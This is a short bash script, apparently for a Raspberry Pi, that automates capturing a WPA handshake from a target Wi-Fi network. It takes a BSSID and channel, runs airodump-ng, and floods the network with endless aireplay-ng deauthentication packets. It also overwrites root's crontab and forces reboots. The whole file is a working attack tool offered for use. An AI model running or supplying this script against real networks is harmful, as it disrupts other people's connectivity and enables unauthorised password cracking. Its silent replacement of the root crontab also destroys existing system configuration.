#!/bin/bash

mon="mon"
path=$(pwd)
file="/nohup.out"

echo "Raspi_Handshake running ..."
echo " "
echo "Enter the BSSID of the target :"
read bssid
echo " "
echo "Enter the channel of the target :"
read chan
echo " "
echo "Enter your network interface name (wlan1 or wlan0 or wlanx ...) : "
read interface
echo " "
echo "Starting ... SSH connection will be broken ! and your ssh client or your Raspi will reboot"
echo "So retablish your ssh connection after rebooting"
echo "Let's catch ! ..."
mkdir ./log/
echo "* * * * * > $path$file" > /var/spool/cron/crontabs/root
sudo airmon-ng check kill >> log_airmon-ng 2>> ./log/log_err_airmong-ng
echo '--------------------------------------' >> ./log/log_airmon-ng
sudo airmon-ng start wlan1 $chan >> ./log/log_airmon-ng 2>> ./log/log_err_airmon-ng
echo '--------------------------------------' >> ./log/log_airmon-ng
echo "sudo airodump-ng -c $chan --bssid $bssid -w psk wlan1mon &" >> auto_airodump.sh
echo "sudo sleep 10" >> auto_airodump.sh
echo "sudo killall aireplay-ng" >> auto_airodump.sh
echo "sudo sleep 25" >> auto_airodump.sh
echo "sudo killall airodump-ng" >> auto_airodump.sh
echo "sudo service NetworkManager restart" >> auto_airodump.sh
echo "sudo reboot" >> auto_airodump.sh
sudo chmod +x auto_airodump.sh
nohup ./auto_airodump.sh & 
sudo aireplay-ng -0 0 -a $bssid $interface$mon >> ./log/log_aireplay 2>> ./log/log_err_aireplay

# Cr34te by N0vachr0n0
